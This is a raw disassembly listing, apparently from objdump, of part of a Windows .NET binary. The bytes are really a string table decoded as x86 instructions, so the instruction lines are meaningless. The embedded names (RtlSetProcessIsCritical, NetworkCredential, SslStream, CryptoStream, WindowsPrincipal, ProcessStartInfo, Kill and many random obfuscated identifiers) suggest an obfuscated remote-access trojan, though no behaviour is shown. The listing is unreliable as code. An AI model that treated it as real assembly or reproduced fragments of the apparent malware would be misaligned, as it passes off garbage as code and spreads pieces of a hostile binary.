  408fa0:	5a                   	pop    %edx
  408fa1:	41                   	inc    %ecx
  408fa2:	69 4c 74 5a 48 76 61 	imul   $0x50617648,0x5a(%esp,%esi,2),%ecx
  408fa9:	50 
  408faa:	6c                   	insb   (%dx),%es:(%edi)
  408fab:	00 71 4f             	add    %dh,0x4f(%ecx)
  408fae:	41                   	inc    %ecx
  408faf:	65 58                	gs pop %eax
  408fb1:	64 55                	fs push %ebp
  408fb3:	41                   	inc    %ecx
  408fb4:	65 45                	gs inc %ebp
  408fb6:	4e                   	dec    %esi
  408fb7:	52                   	push   %edx
  408fb8:	6c                   	insb   (%dx),%es:(%edi)
  408fb9:	00 52 74             	add    %dl,0x74(%edx)
  408fbc:	6c                   	insb   (%dx),%es:(%edi)
  408fbd:	53                   	push   %ebx
  408fbe:	65 74 50             	gs je  0x409011
  408fc1:	72 6f                	jb     0x409032
  408fc3:	63 65 73             	arpl   %esp,0x73(%ebp)
  408fc6:	73 49                	jae    0x409011
  408fc8:	73 43                	jae    0x40900d
  408fca:	72 69                	jb     0x409035
  408fcc:	74 69                	je     0x409037
  408fce:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408fd1:	00 4e 65             	add    %cl,0x65(%esi)
  408fd4:	74 77                	je     0x40904d
  408fd6:	6f                   	outsl  %ds:(%esi),(%dx)
  408fd7:	72 6b                	jb     0x409044
  408fd9:	43                   	inc    %ebx
  408fda:	72 65                	jb     0x409041
  408fdc:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408fdf:	74 69                	je     0x40904a
  408fe1:	61                   	popa
  408fe2:	6c                   	insb   (%dx),%es:(%edi)
  408fe3:	00 53 79             	add    %dl,0x79(%ebx)
  408fe6:	73 74                	jae    0x40905c
  408fe8:	65 6d                	gs insl (%dx),%es:(%edi)
  408fea:	2e 53                	cs push %ebx
  408fec:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408ff0:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  408ff7:	6e 
  408ff8:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408ffb:	61                   	popa
  408ffc:	6c                   	insb   (%dx),%es:(%edi)
  408ffd:	00 57 69             	add    %dl,0x69(%edi)
  409000:	6e                   	outsb  %ds:(%esi),(%dx)
  409001:	64 6f                	outsl  %fs:(%esi),(%dx)
  409003:	77 73                	ja     0x409078
  409005:	50                   	push   %eax
  409006:	72 69                	jb     0x409071
  409008:	6e                   	outsb  %ds:(%esi),(%dx)
  409009:	63 69 70             	arpl   %ebp,0x70(%ecx)
  40900c:	61                   	popa
  40900d:	6c                   	insb   (%dx),%es:(%edi)
  40900e:	00 67 65             	add    %ah,0x65(%edi)
  409011:	74 5f                	je     0x409072
  409013:	49                   	dec    %ecx
  409014:	6e                   	outsb  %ds:(%esi),(%dx)
  409015:	74 65                	je     0x40907c
  409017:	72 76                	jb     0x40908f
  409019:	61                   	popa
  40901a:	6c                   	insb   (%dx),%es:(%edi)
  40901b:	00 73 65             	add    %dh,0x65(%ebx)
  40901e:	74 5f                	je     0x40907f
  409020:	49                   	dec    %ecx
  409021:	6e                   	outsb  %ds:(%esi),(%dx)
  409022:	74 65                	je     0x409089
  409024:	72 76                	jb     0x40909c
  409026:	61                   	popa
  409027:	6c                   	insb   (%dx),%es:(%edi)
  409028:	00 4a 6c             	add    %cl,0x6c(%edx)
  40902b:	75 51                	jne    0x40907e
  40902d:	46                   	inc    %esi
  40902e:	75 53                	jne    0x409083
  409030:	45                   	inc    %ebp
  409031:	45                   	inc    %ebp
  409032:	68 6c 00 6b 65       	push   $0x656b006c
  409037:	72 6e                	jb     0x4090a7
  409039:	65 6c                	gs insb (%dx),%es:(%edi)
  40903b:	33 32                	xor    (%edx),%esi
  40903d:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  409040:	6c                   	insb   (%dx),%es:(%edi)
  409041:	00 75 73             	add    %dh,0x73(%ebp)
  409044:	65 72 33             	gs jb  0x40907a
  409047:	32 2e                	xor    (%esi),%ch
  409049:	64 6c                	fs insb (%dx),%es:(%edi)
  40904b:	6c                   	insb   (%dx),%es:(%edi)
  40904c:	00 6e 74             	add    %ch,0x74(%esi)
  40904f:	64 6c                	fs insb (%dx),%es:(%edi)
  409051:	6c                   	insb   (%dx),%es:(%edi)
  409052:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  409055:	6c                   	insb   (%dx),%es:(%edi)
  409056:	00 4b 69             	add    %cl,0x69(%ebx)
  409059:	6c                   	insb   (%dx),%es:(%edi)
  40905a:	6c                   	insb   (%dx),%es:(%edi)
  40905b:	00 50 6f             	add    %dl,0x6f(%eax)
  40905e:	6c                   	insb   (%dx),%es:(%edi)
  40905f:	6c                   	insb   (%dx),%es:(%edi)
  409060:	00 53 70             	add    %dl,0x70(%ebx)
  409063:	78 55                	js     0x4090ba
  409065:	6b 69 6d 66          	imul   $0x66,0x6d(%ecx),%ebp
  409069:	65 62 70 6c          	bound  %esi,%gs:0x6c(%eax)
  40906d:	00 4d 4a             	add    %cl,0x4a(%ebp)
  409070:	50                   	push   %eax
  409071:	68 5a 76 59 49       	push   $0x4959765a
  409076:	6d                   	insl   (%dx),%es:(%edi)
  409077:	50                   	push   %eax
  409078:	41                   	inc    %ecx
  409079:	71 47                	jno    0x4090c2
  40907b:	6d                   	insl   (%dx),%es:(%edi)
  40907c:	00 4c 4d 6e          	add    %cl,0x6e(%ebp,%ecx,2)
  409080:	61                   	popa
  409081:	58                   	pop    %eax
  409082:	59                   	pop    %ecx
  409083:	6f                   	outsl  %ds:(%esi),(%dx)
  409084:	57                   	push   %edi
  409085:	70 49                	jo     0x4090d0
  409087:	6d                   	insl   (%dx),%es:(%edi)
  409088:	00 46 69             	add    %al,0x69(%esi)
  40908b:	6c                   	insb   (%dx),%es:(%edi)
  40908c:	65 53                	gs push %ebx
  40908e:	74 72                	je     0x409102
  409090:	65 61                	gs popa
  409092:	6d                   	insl   (%dx),%es:(%edi)
  409093:	00 4e 65             	add    %cl,0x65(%esi)
  409096:	74 77                	je     0x40910f
  409098:	6f                   	outsl  %ds:(%esi),(%dx)
  409099:	72 6b                	jb     0x409106
  40909b:	53                   	push   %ebx
  40909c:	74 72                	je     0x409110
  40909e:	65 61                	gs popa
  4090a0:	6d                   	insl   (%dx),%es:(%edi)
  4090a1:	00 53 73             	add    %dl,0x73(%ebx)
  4090a4:	6c                   	insb   (%dx),%es:(%edi)
  4090a5:	53                   	push   %ebx
  4090a6:	74 72                	je     0x40911a
  4090a8:	65 61                	gs popa
  4090aa:	6d                   	insl   (%dx),%es:(%edi)
  4090ab:	00 43 72             	add    %al,0x72(%ebx)
  4090ae:	79 70                	jns    0x409120
  4090b0:	74 6f                	je     0x409121
  4090b2:	53                   	push   %ebx
  4090b3:	74 72                	je     0x409127
  4090b5:	65 61                	gs popa
  4090b7:	6d                   	insl   (%dx),%es:(%edi)
  4090b8:	00 47 5a             	add    %al,0x5a(%edi)
  4090bb:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  4090c2:	6d                   	insl   (%dx),%es:(%edi)
  4090c3:	00 4d 65             	add    %cl,0x65(%ebp)
  4090c6:	6d                   	insl   (%dx),%es:(%edi)
  4090c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4090c8:	72 79                	jb     0x409143
  4090ca:	53                   	push   %ebx
  4090cb:	74 72                	je     0x40913f
  4090cd:	65 61                	gs popa
  4090cf:	6d                   	insl   (%dx),%es:(%edi)
  4090d0:	00 67 4c             	add    %ah,0x4c(%edi)
  4090d3:	4c                   	dec    %esp
  4090d4:	76 74                	jbe    0x40914a
  4090d6:	67 4c                	addr16 dec %esp
  4090d8:	78 6f                	js     0x409149
  4090da:	53                   	push   %ebx
  4090db:	63 6d 00             	arpl   %ebp,0x0(%ebp)
  4090de:	67 65 74 5f          	addr16 gs je 0x409141
  4090e2:	49                   	dec    %ecx
  4090e3:	74 65                	je     0x40914a
  4090e5:	6d                   	insl   (%dx),%es:(%edi)
  4090e6:	00 67 65             	add    %ah,0x65(%edi)
  4090e9:	74 5f                	je     0x40914a
  4090eb:	49                   	dec    %ecx
  4090ec:	73 36                	jae    0x409124
  4090ee:	34 42                	xor    $0x42,%al
  4090f0:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  4090f7:	74 
  4090f8:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  4090ff:	65 6d                	gs insl (%dx),%es:(%edi)
  409101:	00 53 79             	add    %dl,0x79(%ebx)
  409104:	6d                   	insl   (%dx),%es:(%edi)
  409105:	6d                   	insl   (%dx),%es:(%edi)
  409106:	65 74 72             	gs je  0x40917b
  409109:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  409110:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  409117:	79 
  409118:	6d                   	insl   (%dx),%es:(%edi)
  409119:	6d                   	insl   (%dx),%es:(%edi)
  40911a:	65 74 72             	gs je  0x40918f
  40911d:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  409124:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  40912b:	73 
  40912c:	68 41 6c 67 6f       	push   $0x6f676c41
  409131:	72 69                	jb     0x40919c
  409133:	74 68                	je     0x40919d
  409135:	6d                   	insl   (%dx),%es:(%edi)
  409136:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  40913a:	6d                   	insl   (%dx),%es:(%edi)
  40913b:	00 52 61             	add    %dl,0x61(%edx)
  40913e:	6e                   	outsb  %ds:(%esi),(%dx)
  40913f:	64 6f                	outsl  %fs:(%esi),(%dx)
  409141:	6d                   	insl   (%dx),%es:(%edi)
  409142:	00 49 43             	add    %cl,0x43(%ecx)
  409145:	72 79                	jb     0x4091c0
  409147:	70 74                	jo     0x4091bd
  409149:	6f                   	outsl  %ds:(%esi),(%dx)
  40914a:	54                   	push   %esp
  40914b:	72 61                	jb     0x4091ae
  40914d:	6e                   	outsb  %ds:(%esi),(%dx)
  40914e:	73 66                	jae    0x4091b6
  409150:	6f                   	outsl  %ds:(%esi),(%dx)
  409151:	72 6d                	jb     0x4091c0
  409153:	00 45 6e             	add    %al,0x6e(%ebp)
  409156:	75 6d                	jne    0x4091c5
  409158:	00 4f 74             	add    %cl,0x74(%edi)
  40915b:	43                   	inc    %ebx
  40915c:	46                   	inc    %esi
  40915d:	4c                   	dec    %esp
  40915e:	46                   	inc    %esi
  40915f:	50                   	push   %eax
  409160:	69 4a 47 45 79 6d 00 	imul   $0x6d7945,0x47(%edx),%ecx
  409167:	6d                   	insl   (%dx),%es:(%edi)
  409168:	76 4b                	jbe    0x4091b5
  40916a:	4d                   	dec    %ebp
  40916b:	46                   	inc    %esi
  40916c:	73 68                	jae    0x4091d6
  40916e:	62 5a 75             	bound  %ebx,0x75(%edx)
  409171:	70 79                	jo     0x4091ec
  409173:	6d                   	insl   (%dx),%es:(%edi)
  409174:	00 78 53             	add    %bh,0x53(%eax)
  409177:	49                   	dec    %ecx
  409178:	62 41 58             	bound  %eax,0x58(%ecx)
  40917b:	53                   	push   %ebx
  40917c:	65 45                	gs inc %ebp
  40917e:	54                   	push   %esp
  40917f:	6b 75 46 46          	imul   $0x46,0x46(%ebp),%esi
  409183:	6e                   	outsb  %ds:(%esi),(%dx)
  409184:	00 4e 6e             	add    %cl,0x6e(%esi)
  409187:	44                   	inc    %esp
  409188:	62 79 6a             	bound  %edi,0x6a(%ecx)
  40918b:	66 45                	inc    %bp
  40918d:	51                   	push   %ecx
  40918e:	6e                   	outsb  %ds:(%esi),(%dx)
  40918f:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  409193:	6f                   	outsl  %ds:(%esi),(%dx)
  409194:	6f                   	outsl  %ds:(%esi),(%dx)
  409195:	6c                   	insb   (%dx),%es:(%edi)
  409196:	65 61                	gs popa
  409198:	6e                   	outsb  %ds:(%esi),(%dx)
  409199:	00 77 52             	add    %dh,0x52(%edi)
  40919c:	5a                   	pop    %edx
  40919d:	71 51                	jno    0x4091f0
  40919f:	47                   	inc    %edi
  4091a0:	6d                   	insl   (%dx),%es:(%edi)
  4091a1:	57                   	push   %edi
  4091a2:	69 49 66 67 6e 00 4d 	imul   $0x4d006e67,0x66(%ecx),%ecx
  4091a9:	61                   	popa
  4091aa:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  4091b1:	43                   	inc    %ebx
  4091b2:	68 61 69 6e 00       	push   $0x6e6961
  4091b7:	41                   	inc    %ecx
  4091b8:	70 70                	jo     0x40922a
  4091ba:	44                   	inc    %esp
  4091bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4091bc:	6d                   	insl   (%dx),%es:(%edi)
  4091bd:	61                   	popa
  4091be:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4091c5:	43                   	inc    %ebx
  4091c6:	75 72                	jne    0x40923a
  4091c8:	72 65                	jb     0x40922f
  4091ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4091cb:	74 44                	je     0x409211
  4091cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4091ce:	6d                   	insl   (%dx),%es:(%edi)
  4091cf:	61                   	popa
  4091d0:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  4091d7:	00 47 65             	add    %al,0x65(%edi)
  4091da:	74 46                	je     0x409222
  4091dc:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  4091e3:	57 
  4091e4:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  4091eb:	78 
  4091ec:	74 65                	je     0x409253
  4091ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4091ef:	73 69                	jae    0x40925a
  4091f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4091f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4091f3:	00 67 65             	add    %ah,0x65(%edi)
  4091f6:	74 5f                	je     0x409257
  4091f8:	4f                   	dec    %edi
  4091f9:	53                   	push   %ebx
  4091fa:	56                   	push   %esi
  4091fb:	65 72 73             	gs jb  0x409271
  4091fe:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  409205:	74 65                	je     0x40926c
  409207:	6d                   	insl   (%dx),%es:(%edi)
  409208:	2e 49                	cs dec %ecx
  40920a:	4f                   	dec    %edi
  40920b:	2e 43                	cs inc %ebx
  40920d:	6f                   	outsl  %ds:(%esi),(%dx)
  40920e:	6d                   	insl   (%dx),%es:(%edi)
  40920f:	70 72                	jo     0x409283
  409211:	65 73 73             	gs jae 0x409287
  409214:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  40921b:	6c                   	insb   (%dx),%es:(%edi)
  40921c:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  409223:	00 53 79             	add    %dl,0x79(%ebx)
  409226:	73 74                	jae    0x40929c
  409228:	65 6d                	gs insl (%dx),%es:(%edi)
  40922a:	2e 53                	cs push %ebx
  40922c:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409230:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  409237:	68 
  409238:	65 6e                	outsb  %gs:(%esi),(%dx)
  40923a:	74 69                	je     0x4092a5
  40923c:	63 61 74             	arpl   %esp,0x74(%ecx)
  40923f:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  409246:	74 65                	je     0x4092ad
  409248:	6d                   	insl   (%dx),%es:(%edi)
  409249:	2e 52                	cs push %edx
  40924b:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40924e:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409253:	6e                   	outsb  %ds:(%esi),(%dx)
  409254:	00 58 35             	add    %bl,0x35(%eax)
  409257:	30 39                	xor    %bh,(%ecx)
  409259:	43                   	inc    %ebx
  40925a:	65 72 74             	gs jb  0x4092d1
  40925d:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  409264:	43                   	inc    %ebx
  409265:	6f                   	outsl  %ds:(%esi),(%dx)
  409266:	6c                   	insb   (%dx),%es:(%edi)
  409267:	6c                   	insb   (%dx),%es:(%edi)
  409268:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40926d:	6e                   	outsb  %ds:(%esi),(%dx)
  40926e:	00 4d 61             	add    %cl,0x61(%ebp)
  409271:	6e                   	outsb  %ds:(%esi),(%dx)
  409272:	61                   	popa
  409273:	67 65 6d             	gs insl (%dx),%es:(%di)
  409276:	65 6e                	outsb  %gs:(%esi),(%dx)
  409278:	74 4f                	je     0x4092c9
  40927a:	62 6a 65             	bound  %ebp,0x65(%edx)
  40927d:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  409281:	6c                   	insb   (%dx),%es:(%edi)
  409282:	6c                   	insb   (%dx),%es:(%edi)
  409283:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409288:	6e                   	outsb  %ds:(%esi),(%dx)
  409289:	00 73 65             	add    %dh,0x65(%ebx)
  40928c:	74 5f                	je     0x4092ed
  40928e:	50                   	push   %eax
  40928f:	6f                   	outsl  %ds:(%esi),(%dx)
  409290:	73 69                	jae    0x4092fb
  409292:	74 69                	je     0x4092fd
  409294:	6f                   	outsl  %ds:(%esi),(%dx)
  409295:	6e                   	outsb  %ds:(%esi),(%dx)
  409296:	00 43 72             	add    %al,0x72(%ebx)
  409299:	79 70                	jns    0x40930b
  40929b:	74 6f                	je     0x40930c
  40929d:	67 72 61             	addr16 jb 0x409301
  4092a0:	70 68                	jo     0x40930a
  4092a2:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  4092a9:	74 69                	je     0x409314
  4092ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4092ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ad:	00 41 72             	add    %al,0x72(%ecx)
  4092b0:	67 75 6d             	addr16 jne 0x409320
  4092b3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092b5:	74 4e                	je     0x409305
  4092b7:	75 6c                	jne    0x409325
  4092b9:	6c                   	insb   (%dx),%es:(%edi)
  4092ba:	45                   	inc    %ebp
  4092bb:	78 63                	js     0x409320
  4092bd:	65 70 74             	gs jo  0x409334
  4092c0:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  4092c7:	75 6d                	jne    0x409336
  4092c9:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092cb:	74 45                	je     0x409312
  4092cd:	78 63                	js     0x409332
  4092cf:	65 70 74             	gs jo  0x409346
  4092d2:	69 6f 6e 00 4a 65 58 	imul   $0x58654a00,0x6e(%edi),%ebp
  4092d9:	75 65                	jne    0x409340
  4092db:	4c                   	dec    %esp
  4092dc:	54                   	push   %esp
  4092dd:	76 65                	jbe    0x409344
  4092df:	69 70 6e 00 48 53 57 	imul   $0x57534800,0x6e(%eax),%esi
  4092e6:	57                   	push   %edi
  4092e7:	65 72 74             	gs jb  0x40935e
  4092ea:	77 70                	ja     0x40935c
  4092ec:	4f                   	dec    %edi
  4092ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4092ee:	74 6e                	je     0x40935e
  4092f0:	00 48 51             	add    %cl,0x51(%eax)
  4092f3:	4d                   	dec    %ebp
  4092f4:	70 42                	jo     0x409338
  4092f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4092f7:	5a                   	pop    %edx
  4092f8:	4b                   	dec    %ebx
  4092f9:	78 54                	js     0x40934f
  4092fb:	7a 45                	jp     0x409342
  4092fd:	45                   	inc    %ebp
  4092fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4092ff:	00 68 44             	add    %ch,0x44(%eax)
  409302:	58                   	pop    %eax
  409303:	6c                   	insb   (%dx),%es:(%edi)
  409304:	50                   	push   %eax
  409305:	74 55                	je     0x40935c
  409307:	76 63                	jbe    0x40936c
  409309:	50                   	push   %eax
  40930a:	6f                   	outsl  %ds:(%esi),(%dx)
  40930b:	00 41 65             	add    %al,0x65(%ecx)
  40930e:	4a                   	dec    %edx
  40930f:	42                   	inc    %edx
  409310:	4a                   	dec    %edx
  409311:	79 50                	jns    0x409363
  409313:	64 64 6f             	fs outsl %fs:(%esi),(%dx)
  409316:	00 75 7a             	add    %dh,0x7a(%ebp)
  409319:	7a 6b                	jp     0x409386
  40931b:	70 54                	jo     0x409371
  40931d:	63 63 79             	arpl   %esp,0x79(%ebx)
  409320:	70 65                	jo     0x409387
  409322:	6f                   	outsl  %ds:(%esi),(%dx)
  409323:	00 4e 56             	add    %cl,0x56(%esi)
  409326:	6a 6d                	push   $0x6d
  409328:	47                   	inc    %edi
  409329:	48                   	dec    %eax
  40932a:	6f                   	outsl  %ds:(%esi),(%dx)
  40932b:	68 74 57 56 62       	push   $0x62565774
  409330:	66 6f                	outsw  %ds:(%esi),(%dx)
  409332:	00 49 6d             	add    %cl,0x6d(%ecx)
  409335:	61                   	popa
  409336:	67 65 43             	addr16 gs inc %ebx
  409339:	6f                   	outsl  %ds:(%esi),(%dx)
  40933a:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  40933f:	66 6f                	outsw  %ds:(%esi),(%dx)
  409341:	00 46 69             	add    %al,0x69(%esi)
  409344:	6c                   	insb   (%dx),%es:(%edi)
  409345:	65 49                	gs dec %ecx
  409347:	6e                   	outsb  %ds:(%esi),(%dx)
  409348:	66 6f                	outsw  %ds:(%esi),(%dx)
  40934a:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  40934e:	76 65                	jbe    0x4093b5
  409350:	49                   	dec    %ecx
  409351:	6e                   	outsb  %ds:(%esi),(%dx)
  409352:	66 6f                	outsw  %ds:(%esi),(%dx)
  409354:	00 46 69             	add    %al,0x69(%esi)
  409357:	6c                   	insb   (%dx),%es:(%edi)
  409358:	65 53                	gs push %ebx
  40935a:	79 73                	jns    0x4093cf
  40935c:	74 65                	je     0x4093c3
  40935e:	6d                   	insl   (%dx),%es:(%edi)
  40935f:	49                   	dec    %ecx
  409360:	6e                   	outsb  %ds:(%esi),(%dx)
  409361:	66 6f                	outsw  %ds:(%esi),(%dx)
  409363:	00 43 6f             	add    %al,0x6f(%ebx)
  409366:	6d                   	insl   (%dx),%es:(%edi)
  409367:	70 75                	jo     0x4093de
  409369:	74 65                	je     0x4093d0
  40936b:	72 49                	jb     0x4093b6
  40936d:	6e                   	outsb  %ds:(%esi),(%dx)
  40936e:	66 6f                	outsw  %ds:(%esi),(%dx)
  409370:	00 43 53             	add    %al,0x53(%ebx)
  409373:	68 61 72 70 41       	push   $0x41707261
  409378:	72 67                	jb     0x4093e1
  40937a:	75 6d                	jne    0x4093e9
  40937c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40937e:	74 49                	je     0x4093c9
  409380:	6e                   	outsb  %ds:(%esi),(%dx)
  409381:	66 6f                	outsw  %ds:(%esi),(%dx)
  409383:	00 50 72             	add    %dl,0x72(%eax)
  409386:	6f                   	outsl  %ds:(%esi),(%dx)
  409387:	63 65 73             	arpl   %esp,0x73(%ebp)
  40938a:	73 53                	jae    0x4093df
  40938c:	74 61                	je     0x4093ef
  40938e:	72 74                	jb     0x409404
  409390:	49                   	dec    %ecx
  409391:	6e                   	outsb  %ds:(%esi),(%dx)
  409392:	66 6f                	outsw  %ds:(%esi),(%dx)
  409394:	00 6f 57             	add    %ch,0x57(%edi)
  409397:	67 71 57             	addr16 jno 0x4093f1
  40939a:	56                   	push   %esi
  40939b:	76 74                	jbe    0x409411
  40939d:	68 6f 00 6b 5a       	push   $0x5a6b006f
  4093a2:	71 5a                	jno    0x4093fe
  4093a4:	73 76                	jae    0x40941c
  4093a6:	44                   	inc    %esp
  4093a7:	48                   	dec    %eax
  4093a8:	70 66                	jo     0x409410
  4093aa:	46                   	inc    %esi
  4093ab:	45                   	inc    %ebp
  4093ac:	6a 6f                	push   $0x6f
  4093ae:	00 73 71             	add    %dh,0x71(%ebx)
  4093b1:	68 64 79 76 63       	push   $0x63767964
  4093b6:	58                   	pop    %eax
  4093b7:	4d                   	dec    %ebp
  4093b8:	4e                   	dec    %esi
  4093b9:	73 4a                	jae    0x409405
  4093bb:	70 6f                	jo     0x40942c
  4093bd:	00 73 4c             	add    %dh,0x4c(%ebx)
  4093c0:	65 65 54             	gs gs push %esp
  4093c3:	71 57                	jno    0x40941c
  4093c5:	4b                   	dec    %ebx
  4093c6:	76 71                	jbe    0x409439
  4093c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4093c9:	00 79 75             	add    %bh,0x75(%ecx)
  4093cc:	76 69                	jbe    0x409437
  4093ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4093cf:	70 51                	jo     0x409422
  4093d1:	62 4e 7a             	bound  %ecx,0x7a(%esi)
  4093d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4093d5:	4e                   	dec    %esi
  4093d6:	66 75 6f             	data16 jne 0x409448
  4093d9:	00 62 6e             	add    %ah,0x6e(%edx)
  4093dc:	70 70                	jo     0x40944e
  4093de:	50                   	push   %eax
  4093df:	4e                   	dec    %esi
  4093e0:	62 50 64             	bound  %edx,0x64(%eax)
  4093e3:	43                   	inc    %ebx
  4093e4:	4c                   	dec    %esp
  4093e5:	70 00                	jo     0x4093e7
  4093e7:	4e                   	dec    %esi
  4093e8:	7a 65                	jp     0x40944f
  4093ea:	51                   	push   %ecx
  4093eb:	46                   	inc    %esi
  4093ec:	4e                   	dec    %esi
  4093ed:	67 76 76             	addr16 jbe 0x409466
  4093f0:	68 4d 59 6a 50       	push   $0x506a594d
  4093f5:	70 00                	jo     0x4093f7
  4093f7:	47                   	inc    %edi
  4093f8:	4b                   	dec    %ebx
  4093f9:	6a 42                	push   $0x42
  4093fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4093fc:	4b                   	dec    %ebx
  4093fd:	4d                   	dec    %ebp
  4093fe:	69 52 44 6f 51 70 00 	imul   $0x70516f,0x44(%edx),%edx
  409405:	53                   	push   %ebx
  409406:	6c                   	insb   (%dx),%es:(%edi)
  409407:	65 65 70 00          	gs gs jo 0x40940b
  40940b:	52                   	push   %edx
  40940c:	6f                   	outsl  %ds:(%esi),(%dx)
  40940d:	55                   	push   %ebp
  40940e:	52                   	push   %edx
  40940f:	71 76                	jno    0x409487
  409411:	4f                   	dec    %edi
  409412:	49                   	dec    %ecx
  409413:	6e                   	outsb  %ds:(%esi),(%dx)
  409414:	74 6d                	je     0x409483
  409416:	61                   	popa
  409417:	46                   	inc    %esi
  409418:	6a 70                	push   $0x70
  40941a:	00 79 72             	add    %bh,0x72(%ecx)
  40941d:	5a                   	pop    %edx
  40941e:	49                   	dec    %ecx
  40941f:	66 49                	dec    %cx
  409421:	44                   	inc    %esp
  409422:	79 5a                	jns    0x40947e
  409424:	6e                   	outsb  %ds:(%esi),(%dx)
  409425:	70 00                	jo     0x409427
  409427:	71 49                	jno    0x409472
  409429:	44                   	inc    %esp
  40942a:	43                   	inc    %ebx
  40942b:	41                   	inc    %ecx
  40942c:	61                   	popa
  40942d:	68 46 6b 48 55       	push   $0x55486b46
  409432:	49                   	dec    %ecx
  409433:	42                   	inc    %edx
  409434:	6b 70 70 00          	imul   $0x0,0x70(%eax),%esi
  409438:	52                   	push   %edx
  409439:	58                   	pop    %eax
  40943a:	4a                   	dec    %edx
  40943b:	4b                   	dec    %ebx
  40943c:	79 4f                	jns    0x40948d
  40943e:	48                   	dec    %eax
  40943f:	78 4b                	js     0x40948c
  409441:	71 70                	jno    0x4094b3
  409443:	00 4d 69             	add    %cl,0x69(%ebp)
  409446:	63 72 6f             	arpl   %esi,0x6f(%edx)
  409449:	73 6f                	jae    0x4094ba
  40944b:	66 74 2e             	data16 je 0x40947c
  40944e:	43                   	inc    %ebx
  40944f:	53                   	push   %ebx
  409450:	68 61 72 70 00       	push   $0x707261
  409455:	73 4c                	jae    0x4094a3
  409457:	73 42                	jae    0x40949b
  409459:	57                   	push   %edi
  40945a:	57                   	push   %edi
  40945b:	51                   	push   %ecx
  40945c:	69 64 7a 44 74 4b 71 	imul   $0x714b74,0x44(%edx,%edi,2),%esp
  409463:	00 
  409464:	55                   	push   %ebp
  409465:	56                   	push   %esi
  409466:	52                   	push   %edx
  409467:	74 66                	je     0x4094cf
  409469:	70 55                	jo     0x4094c0
  40946b:	54                   	push   %esp
  40946c:	76 77                	jbe    0x4094e5
  40946e:	55                   	push   %ebp
  40946f:	4f                   	dec    %edi
  409470:	71 00                	jno    0x409472
  409472:	71 68                	jno    0x4094dc
  409474:	48                   	dec    %eax
  409475:	71 74                	jno    0x4094eb
  409477:	41                   	inc    %ecx
  409478:	6a 7a                	push   $0x7a
  40947a:	54                   	push   %esp
  40947b:	76 74                	jbe    0x4094f1
  40947d:	55                   	push   %ebp
  40947e:	4d                   	dec    %ebp
  40947f:	51                   	push   %ecx
  409480:	71 00                	jno    0x409482
  409482:	4f                   	dec    %edi
  409483:	69 44 48 55 56 4b 45 	imul   $0x56454b56,0x55(%eax,%ecx,2),%eax
  40948a:	56 
  40948b:	71 00                	jno    0x40948d
  40948d:	75 61                	jne    0x4094f0
  40948f:	78 63                	js     0x4094f4
  409491:	79 74                	jns    0x409507
  409493:	6d                   	insl   (%dx),%es:(%edi)
  409494:	4a                   	dec    %edx
